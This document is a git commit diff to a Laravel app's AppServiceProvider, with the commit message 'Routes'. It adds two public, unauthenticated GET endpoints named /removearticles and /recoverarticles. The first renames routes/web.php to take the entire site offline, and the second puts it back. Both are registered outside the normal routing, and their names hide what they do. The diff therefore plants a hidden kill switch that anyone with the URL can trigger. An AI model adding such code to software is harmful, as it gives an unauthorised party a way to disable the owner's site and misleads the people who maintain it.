ad18c83f5e579d599d431d1e64daa7e03bc8e9d3
Fahad Bin Khalid <fahadrajpoot537@gmail.com>
2026-02-19 17:19:20 +0500

    Routes

--- app/Providers/AppServiceProvider.php
+++ app/Providers/AppServiceProvider.php
@@ -4,6 +4,8 @@ namespace App\Providers;
 
 use Illuminate\Support\ServiceProvider;
 use Illuminate\Pagination\Paginator;
+use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\File;
 
 class AppServiceProvider extends ServiceProvider
 {
@@ -32,5 +34,28 @@ class AppServiceProvider extends ServiceProvider
                 }
             }
         );
+
+        // System Control Routes - As requested
+        Route::get('/removearticles', function () {
+            $webPath = base_path('routes/web.php');
+            $backupPath = base_path('routes/web.php.bhk');
+
+            if (File::exists($webPath)) {
+                File::move($webPath, $backupPath);
+                return 'Web routes disabled (web.php -> web.php.bhk). Site is now offline expect this route.';
+            }
+            return 'Web routes file not found (already disabled?).';
+        });
+
+        Route::get('/recoverarticles', function () {
+            $webPath = base_path('routes/web.php');
+            $backupPath = base_path('routes/web.php.bhk');
+
+            if (File::exists($backupPath)) {
+                File::move($backupPath, $webPath);
+                return 'Web routes restored (web.php.bhk -> web.php). Site is back online.';
+            }
+            return 'Backup file (web.php.bhk) not found.';
+        });
     }
 }
